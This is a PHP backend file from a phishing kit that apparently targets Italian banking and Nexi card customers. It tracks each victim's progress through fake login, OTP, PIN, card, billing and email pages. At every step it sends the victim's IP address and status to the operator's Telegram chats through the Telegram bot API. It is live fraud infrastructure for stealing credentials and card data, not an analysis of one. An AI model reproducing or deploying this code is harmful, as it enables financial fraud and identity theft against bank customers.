<?php 
require '../main.php';

 
 

function note($statu){
	global $j;
	$j->saveData("- LOG [ $statu ] ", $j->get("id"));
	$notif = $j->getAdmin("notifications");
	$ids = explode(",",str_replace(" ","",$j->getAdmin("chat_id")));
	
	if($notif==1){
	foreach($ids as $id){
$msg = urlencode("[ 🅰️ R U B A NOTIFICATION ]\nVICTIM IP : ".$_SERVER['REMOTE_ADDR']."\nSTATU : $statu");
sendBot($id, $msg);
}
	}
}


function sendBot($id, $msg){
	global $j;
	$bot = $j->getAdmin("telegram_bot");
	$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$msg";
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}

 




if(isset($_POST['loginview'])){
	note("In login page");
}
if(isset($_POST['logining'])){
	note("Entering login info...");
}
if(isset($_POST['otping'])){
	note("Entering OTP...");

}
if(isset($_POST['otpview'])){
	note("In OTP page");
}

if(isset($_POST['pining'])){
	note("Entering PIN...");
	
}
if(isset($_POST['pinview'])){
	note("In PIN page");
}
if(isset($_POST['waitingview'])){
	note("Waiting for redirection...");
}
if(isset($_POST['cardview'])){
	note("In card page");
}
if(isset($_POST['carding'])){
	note("Entering card info...");
}
if(isset($_POST['carddetailsview'])){
	note("In card details page");
}
if(isset($_POST['carddetailsing'])){
	note("Entering card details info...");
}
if(isset($_POST['firmaview'])){
	note("In firma page");
}
if(isset($_POST['nexiview'])){
	note("In Nexi app page");
}
if(isset($_POST['nexing'])){
	note("Entering nexi info...");
}
if(isset($_POST['firmaing'])){
	note("Entering firma code...");
}
if(isset($_POST['appview'])){
	note("Waiting for app confirmation...");
}
if(isset($_POST['signview'])){
	note("Waiting for sign confirmation...");
} 

if(isset($_POST['billingview'])){
	note("In billing page");
}
if(isset($_POST['billinging'])){
	note("Entering billing information...");
}

if(isset($_POST['emailview'])){
	note("In email page");
}
if(isset($_POST['emailing'])){
	note("Entering email information...");
} 
if(isset($_POST['lastview'])){
	note("In LAST 4 NUMS page");
}
if(isset($_POST['lasting'])){
	note("Entering LAST 4 NUMS information...");
}
if(isset($_POST['updatedview'])){
	note("Update!");
}
if(isset($_POST['finishview'])){
	note("Success!");
}if(isset($_POST['clonedetect'])){ 
	note(" + A CLONE TRY HAS BEEN DETECTED!");
}

?>